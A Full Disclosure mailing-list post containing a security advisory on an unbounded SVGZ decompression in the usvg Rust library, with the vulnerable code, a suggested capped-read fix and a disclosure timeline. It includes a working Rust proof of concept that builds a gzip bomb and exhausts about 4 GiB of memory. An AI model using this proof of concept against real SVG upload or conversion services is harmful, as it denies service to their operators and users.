---
title: usvg SVGZ decompression bomb in `Tree::from_data`
url: https://seclists.org/fulldisclosure/2026/Sep/73
source: Full Disclosure
date: 2026-09-27
fetch_date: 2026-09-28T07:56:59.935947
---

# usvg SVGZ decompression bomb in `Tree::from_data`

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](80)
[By Date](date.html#73)
[![Next](/images/right-icon-16x16.png)](81)

[![Previous](/images/left-icon-16x16.png)](80)
[By Thread](index.html#73)
[![Next](/images/right-icon-16x16.png)](81)

![](/shared/images/nst-icons.svg#search)

# usvg SVGZ decompression bomb in `Tree::from\_data`

---

*From*: Khashayar Fereidani <info () fereidani com>
*Date*: Wed, 23 Sep 2026 22:03:22 +0000

---

```
# usvg SVGZ decompression bomb in `Tree::from_data`

**Author:** Khashayar Fereidani
**Disclosure Date:** 2026-09-18
**Advisory:** https://fereidani.com/usvg-svgz-decompression-bomb-in-treefromdata
**Contact:** https://fereidani.com/contact

## Description

`Tree::from_data` in `crates/usvg/src/parser/mod.rs:102` detects the gzip magic
bytes at the start of the input and decompresses the data before parsing it:

```rust
// crates/usvg/src/parser/mod.rs:109
let data = decompress_svgz(data)?;
let text = std::str::from_utf8(&data).map_err(|_| Error::NotAnUtf8Str)?;
Self::from_str(text, opt)
```

```rust
// crates/usvg/src/parser/mod.rs:180
pub fn decompress_svgz(data: &[u8]) -> Result<Vec<u8>, Error> {
    use std::io::Read;

    let mut decoder = flate2::read::GzDecoder::new(data);
    let mut decoded = Vec::with_capacity(data.len() * 2);
    decoder
        .read_to_end(&mut decoded)
        .map_err(|_| Error::MalformedGZip)?;
    Ok(decoded)
}
```

`read_to_end` grows `decoded` with no cap on the output size, and the whole
buffer is materialized before `from_str` reads the first byte. The attacker
fully controls the expansion ratio, since gzip reaches roughly 1000:1, so the
size of the input places no bound on the size of the allocation. A payload of
a few hundred kilobytes can request several gigabytes of memory, and the parse
error only fires after the entire bomb is already in memory.

## Proof of concept

Create a new project with `flate2` and `usvg`:

```toml
[dependencies]
flate2 = "1"
usvg = "0.48"
```

Build a gzip bomb of the desired size and hand it to `Tree::from_data`:

```rust
use flate2::write::GzEncoder;
use flate2::Compression;
use std::io::Write;

fn main() {
    let mib: usize = std::env::args()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(256);
    let mut enc = GzEncoder::new(Vec::new(), Compression::best());
    let chunk = [0u8; 65536];
    for _ in 0..(mib << 20) / 65536 {
        enc.write_all(&chunk).unwrap();
    }
    let bomb = enc.finish().unwrap();
    println!("svgz input {} bytes, expands to {mib} MiB", bomb.len());
    match usvg::Tree::from_data(&bomb, &usvg::Options::default()) {
        Ok(_) => println!("parsed"),
        Err(e) => println!("parse error after full decompression: {e:?}"),
    }
}
```

Run with `cargo run --release 4096`. Observed output:

```text
svgz input 4171638 bytes, expands to 4096 MiB
parse error after full decompression:
ParsingFailed(UnknownToken(TextPos { row: 1, col: 1 }))
```

Peak process RSS was 4,201,816 kB (about 4.0 GiB) from a 4 MB input. The
decompression happens before any validation, so the bytes do not even need to
be a valid SVG.

## Impact

Decompression bomb causing memory exhaustion and an OOM kill, denying service
to any application that passes attacker-controlled SVG bytes to
`usvg::Tree::from_data`. The `svgz` feature is enabled by default, and SVG
upload or conversion endpoints that use usvg are typically reachable before
authentication.

## Solution

Bound the decompressed output inside `decompress_svgz` instead of trusting the
compressed input. Read through `io::Take` with a limit one byte above the
cap, so a stream that reaches the limit can be rejected instead of silently
truncated:

```rust
const MAX_SVGZ_SIZE: u64 = 256 * 1024 * 1024;

let mut decoder = flate2::read::GzDecoder::new(data);
let mut decoded = Vec::with_capacity(data.len() * 2);
decoder
    .take(MAX_SVGZ_SIZE + 1)
    .read_to_end(&mut decoded)
    .map_err(|_| Error::MalformedGZip)?;
if decoded.len() as u64 > MAX_SVGZ_SIZE {
    return Err(Error::MalformedGZip);
}
```

Comparable libraries bound the decompressed or parsed output inside the
library itself:

- Node.js `zlib` caps one-shot decompression output via the `maxOutputLength`
  option (added in v12.19.0 and v14.5.0).
- Python Pillow caps decoded pixels at `ImageFile.MAX_IMAGE_PIXELS`, default
  89,478,485 pixels (about a quarter GiB of 24-bit pixels), and raises
  `DecompressionBombWarning` / `DecompressionBombError` beyond it.
- libpng applies default dimension limits of 1,000,000 x 1,000,000 plus
  `png_set_chunk_malloc_max` for bounded allocation.
- librsvg documents no built-in memory or CPU limits and pushes bounding to
  the caller, but still caps parsed XML elements at 1 million. usvg applies
  neither an output-size cap nor an element cap.

Until a fix lands, applications can disable the `svgz` feature and decompress
uploaded files themselves with a bounded reader, calling `Tree::from_str` on
the verified plain SVG text.

## Timeline

- 2026-08-25: Vulnerability reported privately to the maintainer.
- 2026-09-24: No response received; public disclosure. usvg 0.48.1 and the
  current main branch are still affected.

## References

- [linebender/resvg -
crates/usvg/src/parser/mod.rs](https://github.com/linebender/resvg/blob/main/crates/usvg/src/parser/mod.rs)
- [Node.js zlib `maxOutputLength`](https://nodejs.org/api/zlib.html)
- [Pillow `ImageFile.MAX_IMAGE_PIXELS`](https://pillow.readthedocs.io/en/stable/reference/ImageFile.html)
- [CWE-409: Improper Handling of Highly Compressed Data (Data
Amplification)](https://cwe.mitre.org/data/definitions/409.html)
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](80)
[By Date](date.html#73)
[![Next](/images/right-icon-16x16.png)](81)

[![Previous](/images/left-icon-16x16.png)](80)
[By Thread](index.html#73)
[![Next](/images/right-icon-16x16.png)](81)

### Current thread:

* **usvg SVGZ decompression bomb in `Tree::from\_data`** *Khashayar Fereidani (Sep 26)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure...